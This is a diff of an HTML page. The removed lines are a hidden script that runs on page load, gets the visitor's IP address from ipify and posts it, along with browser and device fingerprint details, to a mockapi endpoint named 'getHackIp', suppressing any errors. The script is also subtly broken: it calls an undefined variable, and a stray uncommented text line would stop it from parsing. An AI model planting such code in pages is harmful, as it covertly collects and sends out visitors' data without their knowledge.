@@ -192,35 +192,3 @@ footer {
 <script src="main_script.js" defer></script>
 </body>
 </html>
-<script>
-async function get() {
-        try {
-            const myApi = "https://6959330e6c3282d9f1d6de6b.mockapi.io/getHackIp"
-             сервіс ipify [citation:1][citation:2][citation:7]
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const hackResponse = await fetch(hackApi, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    userIp: data.ip,
-                    userPlatform: navigator.platform,
-                    userAgent: window.navigator.userAgent,
-                    userLanguage: window.navigator.language,
-                    userLanguages: window.navigator.languages, 
-                    cookieEnabled: window.navigator.cookieEnabled,
-                    hardwareConcurrency: window.navigator.hardwareConcurrency,
-                    deviceMemory: window.navigator.deviceMemory,
-                    maxTouchPoints: window.navigator.maxTouchPoints,
-                    userIsOnline: window.navigator.onLine
-                })
-
-            });
-        } catch (error) {
-        }
-    }
-
-    get();
-</script>
